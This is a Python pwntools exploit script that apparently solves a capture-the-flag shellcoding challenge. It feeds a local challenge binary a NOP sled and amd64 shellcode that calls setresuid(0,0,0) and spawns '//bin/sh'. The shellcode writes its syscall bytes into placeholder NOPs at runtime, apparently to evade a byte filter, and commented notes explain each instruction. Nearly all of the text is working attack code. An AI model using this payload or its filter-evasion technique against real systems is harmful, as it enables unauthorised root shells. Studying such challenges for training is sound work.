from pwn import *

elf = ELF('/challenge/babyshell-level-5')
io = process(elf.path)

context.arch = 'amd64'
context.os = 'linux'

sled_size = 200
nop_sled = asm('nop') * sled_size

"""
- clear rsi (function argument storage)
- clear rdx (function argument storage)
- clear rax (syscall specifier)
- setresuid syscall (0, 0, 0)
- load rbx with address of current rip + 13 to the 2 nops to overwrite with syscalll
- jump to rbx to do the syscall
- clear rsi (function argument storage)
- clear rdx (function argument storage)
- clear rax (syscall specifier)
- push rax, the syscall specifier onto the stack
- move the value "//bin/sh" iinto rbx
- push rbx, which has the value of "//bin/sh" onto the stack
- move the value of rsp into function argument rdi, "//bin/sh" is on top of the stack thus takes rsp
- load rbx with the address of the current point (rip) + size 13 which is the 2 nop instructions (as "syscall" splits into 2)
- move the splits of syscall into the two dummy nops respectively
- move 59 to al to signify "execve" syscall
- jump to rbx for action
"""

shell = """
xor rdi, rdi
xor rsi, rsi
xor rdx, rdx

mov al, 117
lea rbx, [rip + 13]
mov byte ptr [rbx], 0x0f
mov byte ptr [rbx+1], 0x05
jmp rbx

xor rsi, rsi
xor rdx, rdx
xor rax, rax
push rax
mov rbx, 0x68732f6e69622f2f
push rbx
mov rdi, rsp

lea rbx, [rip + 13]
mov byte ptr [rbx], 0x0f
mov byte ptr [rbx+1], 0x05

mov al, 59
jmp rbx

nop
nop
"""

shellcode = asm(shell)

final_shellcode = nop_sled + shellcode

io.sendline(final_shellcode)
io.interactive()